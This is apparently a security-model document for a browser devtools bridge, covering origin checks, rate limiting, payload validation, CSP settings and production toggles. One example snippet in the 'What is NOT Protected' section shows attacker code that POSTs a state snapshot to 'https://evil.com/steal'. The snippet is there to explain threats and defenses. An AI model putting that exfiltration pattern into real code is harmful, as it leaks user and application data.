# Security Model

## Overview

The Journey DevTools bridge follows the **same security architecture as React DevTools, Redux DevTools, and Vue DevTools**. It provides origin isolation and developer workflow safety, but does not (and cannot) protect against malicious code running in the same page context.

## What is Protected

### ✅ Origin Isolation

Commands from `evil.com` cannot control machines on `yourapp.com`. The bridge validates that messages originate from the expected window origin.

```typescript
// Only messages from the same origin are processed
if (event.source !== window || !isExpectedWindowOrigin(event.origin)) {
  return;
}
```

### ✅ Cross-Tab Protection

Tab A cannot send commands to machines in Tab B. Each tab has its own isolated message channel.

### ✅ Rate Limiting

Built-in rate limiter prevents command abuse (100 commands per 10-second window).

```typescript
// Prevents rapid-fire command attacks
if (!rateLimiter.isAllowed()) {
  return error("Command rate limit exceeded");
}
```

### ✅ Deep Payload Validation

All commands and payloads are validated before execution:

- Maximum nesting depth (10 levels)
- Maximum payload size (500KB)
- Prototype pollution defense
- Circular reference rejection
- Type and format validation

### ✅ Developer Workflow Safety

- Commands disabled by default in production (`NODE_ENV=production`)
- Optional command toggling via `commandsEnabled` flag
- Clear error messages for debugging
- No token/session-based command auth API is part of the current public bridge surface

## What is NOT Protected

### ❌ Malicious Code in Your Application

**If an attacker can run JavaScript in your page context, they already have direct access to everything:**

```javascript
// Attacker doesn't need the devtools bridge - they have the machine!
const machine = window.__myMachine__;
machine.send({ type: "admin_action" });
machine.resetJourney();
// Or just steal data directly
fetch("https://evil.com/steal", {
  method: "POST",
  body: JSON.stringify(machine.getSnapshot())
});
```

The devtools bridge uses `window.postMessage` for extension ↔ page communication (like React/Redux/Vue DevTools). This means page scripts can see messages, but **this doesn't matter** because malicious code already has direct access to your machine instances.

### ❌ XSS Vulnerabilities

If your application has XSS vulnerabilities, fix them at the application layer. The devtools bridge cannot protect against XSS - no devtools can.

### ✅ CSP Guidance

Keep a strict application Content Security Policy. The bridge is designed to work without loosening your page policy because it does not fetch remote code or require privileged script sources.

- Keep `script-src` limited to your own app plus trusted nonces or hashes.
- Do not add `unsafe-inline`, `unsafe-eval`, remote script hosts, or browser extension origins just to support the bridge.
- Restrict `connect-src`, `img-src`, `style-src`, and `font-src` to the origins your app actually needs. The bridge itself does not require extra network destinations.
- Use `object-src 'none'`, `base-uri 'self'`, and `frame-ancestors 'none'` unless your app has a specific reason to allow more.

Minimal baseline:

```text
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-<generated-per-request>';
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
```

Add other directives only for concrete application needs. If a dev-only integration appears to require a weaker CSP, treat that as an integration bug rather than a reason to relax the policy for all users.

### ❌ Physical Access to Debug Sessions

If someone has physical access to a machine with devtools open, they can send commands. This is true for all browser devtools.

## Best Practices

### For Production

```typescript
// Disable entirely in production
attachJourneyDevtools(machine, {
  enabled: process.env.NODE_ENV !== "production"
});
```

### For Development

```typescript
// Enable with commands
attachJourneyDevtools(machine, {
  enabled: true,
  commandsEnabled: true
});
```

### For Staging/QA

```typescript
// Enable read-only mode
attachJourneyDevtools(machine, {
  enabled: true,
  commandsEnabled: false // Can view state, but not send commands
});
```

## Real Security Measures

To secure your application:

1. **Fix XSS vulnerabilities** - Sanitize user input and enforce a strict Content Security Policy
2. **Validate state transitions** - Implement guards in your machine definition
3. **Server-side validation** - Never trust client state for critical operations
4. **Disable in production** - Keep devtools disabled for public users
5. **Use HTTPS** - Prevent man-in-the-middle attacks
6. **Audit dependencies** - Run `npm audit` regularly

## Architecture

```text
DevTools Panel (Extension)
    ↓
Background Script (Extension)
    ↓
Content Script (Extension) - Injects into page
    ↓
window.postMessage - Visible to all same-origin scripts
    ↓
Bridge (Page Context) - Validates origin, rate limits, deep validation
    ↓
Machine (Page Context) - Already accessible to all page scripts
```

**Key Point**: The `window.postMessage` boundary is visible to all scripts in the page context. This is by design and matches how all major browser devtools work. The security comes from origin validation, not message hiding.
